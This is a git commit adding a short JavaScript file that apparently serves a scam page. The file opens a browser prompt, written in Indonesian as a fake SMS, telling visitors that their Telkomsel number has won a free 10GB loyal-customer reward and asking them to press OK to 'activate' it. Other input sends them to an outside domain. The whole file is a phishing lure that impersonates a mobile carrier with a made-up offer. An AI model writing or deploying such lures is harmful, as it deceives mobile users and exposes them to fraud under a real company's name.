8234a5050e7fd72239020dc6fe58ec61e9d859cd
ekpanewblog5 <ukpehaitid3@gmail.com>
2025-12-23 17:17:50 +0100

    Create telkomsel-active.js

---
+++ telkomsel-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'AKTIFKAN 10GB'
+password = prompt(
+  'SMS: Selamat! Nomor Telkomsel Anda memenuhi syarat untuk menerima Reward Pelanggan Lama 10GB. Silakan tekan OK untuk Mengaktifkan sekarang..',
+  'AKTIFKAN 10GB'
+);
+if (password != 'AKTIFKAN 10GB') {
+  location.href = 'https://ohfer.org/telkomsel.html';
+}
